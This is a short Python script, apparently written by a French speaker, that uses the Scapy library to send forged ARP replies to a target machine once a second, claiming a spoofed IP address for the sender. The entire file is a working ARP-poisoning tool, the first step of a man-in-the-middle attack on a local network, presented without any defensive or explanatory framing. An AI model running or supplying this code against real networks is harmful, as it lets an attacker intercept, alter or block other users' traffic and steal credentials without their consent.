from scapy.all import *
import sys

victime  = sys.argv[1]
fausse_ip = sys.argv[2]

while True:

    paquet = ARP(op=2, pdst=victime, psrc=fausse_ip)

    send(paquet, verbose=0)
    print(f"pour {victime}, je suis {fausse_ip}")

    time.sleep(1)